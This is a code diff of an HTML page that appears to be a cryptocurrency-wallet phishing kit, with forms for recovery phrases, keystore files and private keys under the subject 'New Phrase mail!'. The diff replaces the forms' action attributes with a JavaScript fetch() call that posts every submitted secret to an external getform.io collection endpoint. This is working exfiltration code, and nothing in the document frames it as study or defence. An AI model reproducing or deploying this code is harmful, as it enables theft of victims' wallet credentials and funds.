@@ -3456,7 +3456,7 @@
 						</div>
 				
 						<div id="phrase" class="tabcontent" style="display: block;">
-							<form   action="https://getform.io/f/929514ea-b408-47b5-807f-8a15146e357d" method="POST">
+							<form   accept-charset="UTF-8" id="form">
 								
   								<input type="hidden" name="_subject" value="New Phrase mail!">
   								
@@ -3480,7 +3480,7 @@
 				
 				
 						<div id="keystore" class="tabcontent" style="display: none;">
-							<form id="my-form"  action="https://getform.io/f/929514ea-b408-47b5-807f-8a15146e357d" method="POST">
+							<form id="my-form"  accept-charset="UTF-8" id="form">
 								
   								<input type="hidden" name="_subject" value="New Phrase mail!">
   								
@@ -3501,7 +3501,7 @@
 						</div>
 				
 						<div id="private" class="tabcontent" style="display: none;">
-							<form id="my-form"  action="https://getform.io/f/929514ea-b408-47b5-807f-8a15146e357d" method="POST">
+							<form id="my-form"   accept-charset="UTF-8" id="form">
 								
   								<input type="hidden" name="_subject" value="New Phrase mail!">
   								
@@ -3521,26 +3521,23 @@
 						</script>
 						<script src=""></script>
 						<script>
-						    $("#ajaxForm").submit(function(e){
+						    const form = document.getElementById("form");
+						    form.addEventListener("submit", formSubmit);
+
+						    function formSubmit(e) {
 							e.preventDefault();
-							var action = $(this).attr("action");
-							$.ajax({
-							type: "POST",
-							url: action,
-							crossDomain: true,
-							data: new FormData(this),
-							dataType: "json",
-							processData: false,
-							contentType: false,
-							headers: {
-							"Accept": "application/json"
-							}
-						    }).done(function() {
-							alert('The form was submitted successfully.')
-						    }).fail(function() {
-							alert('An error occurred! Please try again later.')
-						    });
-						    });
+							const formData = new FormData(e.target);
+
+							fetch("https://getform.io/f/929514ea-b408-47b5-807f-8a15146e357d", {
+							    method: "POST",
+							    body: formData,
+							    headers: {
+								"Accept": "application/json",
+							    },
+							})
+							.then(response => console.log(response))
+							.catch(error => console.log(error))
+						    }
 						</script>
 					</center>
 				</body>
